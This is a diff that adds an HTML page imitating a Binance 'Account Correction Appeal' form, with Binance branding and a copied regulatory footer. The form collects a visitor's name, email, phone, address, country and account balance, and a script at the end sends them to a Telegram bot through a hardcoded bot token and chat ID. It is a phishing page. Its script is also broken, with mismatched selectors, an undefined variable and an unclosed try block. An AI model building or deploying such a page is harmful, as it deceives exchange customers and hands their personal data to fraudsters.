@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Information Correction Appeal - Binance</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "BinancePlex", "IBM Plex Sans", sans-serif;
+            background-color: #1F2630;
+            color: #F5F5F5;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 40px;
+            background-color: #1E252F;
+            border-bottom: 1px solid #3A414B;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #F0B90B;
+        }
+
+        .logo-icon {
+            width: 24px;
+            height: 24px;
+            background-color: #F0B90B;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #1F2630;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .sign-up-btn {
+            background-color: #F0B90B;
+            color: #1F2630;
+            border: none;
+            padding: 8px 24px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            color: #F5F5F5;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* Main Content */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            min-height: calc(100vh - 60px);
+        }
+
+        .form-section {
+            flex: 1;
+            padding: 80px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        .form-title {
+            font-size: 32px;          
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #F5F5F5;
+        }
+
+        .form-subtitle {
+            font-size: 32px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 48px;
+            color: #F5F5F5;
+        }
+
+        .form-content {
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 450;
+            margin-bottom: 8px;
+            color: #A0A7B2;
+        }
+
+        .form-input, .form-select {
+            width: 100%;
+            padding: 12px 16px;
+            background-color: #1E252F;
+            border: 1px solid #3A414B;
+            color: #F5F5F5;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        .form-input:focus, .form-select:focus {
+            outline: none;
+            border-color: #F0B90B;
+            background-color: #1E252F;
+        }
+
+        .form-input::placeholder {
+            color: #7B828C;
+            font-weight: 450;
+            
+        }
+
+        .form-select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23A0A7B2' d='M1 1l5 5 5-5'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            padding-right: 36px;
+            cursor: pointer;
+        }
+
+        .form-select option {
+            background-color: #1E252F;
+            color: #F5F5F5;
+        }
+
+        .form-note {
+            font-size: 12px;
+            color: #A0A7B2;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .form-grid.full {
+            grid-template-columns: 1fr;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #5B616B;
+            color: #A0A7B2;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-top: 32px;
+            transition: background-color 0.3s;
+        }
+
+        .continue-btn:hover {
+            background-color: #5B616B;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #1F2630;
+            padding: 80px 20px 20px;
+            border-top: 1px solid #3A414B;
+        }
+
+        .footer-sections {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 40px;
+            margin-bottom: 60px;
+        }
+
+        .footer-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .footer-section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #F5F5F5;
+        }
+
+        .footer-section-toggle {
+            background: none;
+            border: none;
+            color: #F0B90B;
+            font-size: 24px;
+            cursor: pointer;
+            display: none;
+        }
+
+        .footer-community {
+            max-width: 1200px;
+            margin: 0 auto;
+            margin-bottom: 48px;
+        }
+
+        .community-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #F5F5F5;
+            margin-bottom: 24px;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .social-icon {
+            width: 36px;
+            height: 36px;
+            background-color: transparent;
+            border: 1px solid #3A414B;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #F5F5F5;
+            text-decoration: none;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .social-icon:hover {
+            background-color: #F0B90B;
+            color: #1F2630;
+            border-color: #F0B90B;
+        }
+
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 24px;
+            border-top: 1px solid #3A414B;
+            flex-wrap: wrap;
+            gap: 24px;
+        }
+
+        .footer-controls {
+            display: flex;
+            gap: 32px;
+            align-items: center;
+        }
+
+        .control-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #F5F5F5;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .control-icon {
+            font-size: 18px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #7B828C;
+            line-height: 1.6;
+            flex: 1;
+        }
+
+        .footer-copyright {
+            font-size: 12px;
+            color: #7B828C;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header {
+                padding: 16px 20px;
+            }
+
+            .form-section {
+                padding: 40px 20px;
+            }
+
+            .footer-sections {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+
+            .footer-section {
+                justify-content: space-between;
+            }
+
+            .footer-section-toggle {
+                display: block;
+            }
+
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .form-title, .form-subtitle {
+                font-size: 24px;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+           <div>
+          <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/1280px-Binance_logo.svg.png" width="100" height="auto"></div>
+        </div>
+        <div class="header-right">
+            <button class="sign-up-btn">Sign Up</button>
+            <button class="menu-btn">☰</button>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <div class="form-section">
+            <div class="form-content">
+                <h1 class="form-title">Account Correction Appeal</h1>
+                <h2 class="form-subtitle"></h2>
+                <form>
+                    <!-- Full Name -->
+                    <div class="form-group">
+                        <label class="form-label">Full Name</label>
+                        <input type="text" class="form-input" placeholder="Full name" required>
+                    </div>
+
+                    <!-- Email Address -->
+                    <div class="form-group">
+                        <label class="form-label">Email Address</label>
+                        <input type="email" class="form-input" placeholder="Email address" required>
+                    </div>
+
+                    <!-- Phone Number -->
+                    <div class="form-group">
+                        <label class="form-label">Phone Number</label>
+                        <input type="tel" class="form-input" placeholder="Phone number (with country code)" required>
+                    </div>
+
+                    <!-- Address -->
+                    <div class="form-group">
+                        <label class="form-label">Address</label>
+                        <input type="text" class="form-input" placeholder="Address" required>
+                    </div>
+
+                    <!-- City -->
+                    <div class="form-group">
+                        <label class="form-label">City</label>
+                        <input type="text" class="form-input" placeholder="City" required>
+                    </div>
+
+                    <!-- State/Province and Postal Code -->
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label class="form-label">State/Province</label>
+                            <input type="text" class="form-input" placeholder="State/Province" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Postal Code</label>
+                            <input type="text" class="form-input" placeholder="Postal code" required>
+                        </div>                        
+                    </div>
+
+                    <!-- Country -->
+                    <div class="form-group">
+                        <label class="form-label">Country</label>
+                        <select class="form-select" required>
+                            <option value="">Country</option>
+                            <option value="us">United States</option>
+                            <option value="ca">Canada</option>
+                            <option value="uk">United Kingdom</option>
+                            <option value="au">Australia</option>
+                            <option value="de">Germany</option>
+                            <option value="it">Italy</option>
+                            <option value="fr">France</option>
+                            <option value="jp">Japan</option>
+                            <option value="cn">China</option>
+                            <option value="in">India</option>
+                            <option value="br">Brazil</option>
+                        </select>
+                    </div>
+
+                    <!-- Reason for Appeal -->
+                    <div class="form-group">
+                        <div class="form-group">
+    <label class="form-label">Balance</label>
+    <input 
+        type="text" 
+        class="form-input" 
+        id="balanceInput"
+        inputmode="decimal"
+        placeholder="Account Balance" 
+        required
+    >
+</div>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <button type="submit" class="continue-btn">Continue</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+   <div class="footer">
+        <div class="footer-sections">
+            <div class="footer-text">
+                <p><strong>Binance ADGM entities</strong> are regulated by the Financial Services Regulatory Authority (FSRA) of the Abu Dhabi Global Market (ADGM) as follows: (1) DIFC Exchange Limited is recognised as a Recognised Investment Exchange (Derivatives), with a stipulation to Operate a Multilateral Trading Facility; (2) Neon Clearing and Custody Limited is recognised as a Recognised Clearing House, with a stipulation to Provide Custody and operating a Central Securities Depository; (3) Neon Trading Limited is authorised to carry out the following Regulated Activities: (I) Dealing in Investments as Principal; (II) Dealing in Investments as Agent; (III) Arranging Deals in investments; (IV) Managing Assets; (V) Providing Money Services; and (VI) Arranging Custody.</p>
+            </div>
+            <div class="footer-copyright">
+                Binance© 2026<br>
+                Cookie Preferences
+            </div>
+        </div>
+    </div>
+    <script>
+// Auto format balance input with commas
+const balanceInput = document.getElementById("balanceInput");
+
+balanceInput.addEventListener("input", function(e) {
+    let value = e.target.value.replace(/[^0-9.]/g, '');
+
+    // Prevent multiple dots
+    const parts = value.split('.');
+    if (parts.length > 2) {
+        value = parts[0] + '.' + parts.slice(1).join('');
+    }
+
+    let numberParts = value.split('.');
+
+    // Format integer part with commas
+    numberParts[0] = numberParts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+
+    e.target.value = numberParts.join('.');
+});
+
+document.querySelector("form").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const fullName = document.querySelector('input[placeholder="Enter your full name"]').value;
+    const email = document.querySelector('input[placeholder="Enter your email address"]').value;
+    const phone = document.querySelector('input[placeholder="Enter your phone number"]').value;
+    const address = document.querySelector('input[placeholder="Enter your address"]').value;
+    const city = document.querySelector('input[placeholder="Enter your city"]').value;
+    const state = document.querySelector('input[placeholder="Enter state/province"]').value;
+    const postal = document.querySelector('input[placeholder="Enter postal code"]').value;
+    const balance = document.getElementById("balanceInput").value;
+    const country = document.querySelectorAll(".form-select")[0].value;   
+
+    const BOT_TOKEN = "8281561796:AAHc7r8g6Ba70YFWsV8ygD5uXnf3dWmiGp0";
+    const CHAT_ID = "8624745089";
+
+    const message = `
+📥 New Form Submission
+
+👤 Full Name: ${fullName}
+📧 Email: ${email}
+📱 Phone: ${phone}
+🏠 Address: ${address}
+🏙 City: ${city}
+🗺 State: ${state}
+📮 Postal Code: ${postal}
+💰 Balance: € ${balance}
+🌍 Country: ${country}
+${reason}
+    `;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+</script>
+</body>
+</html>
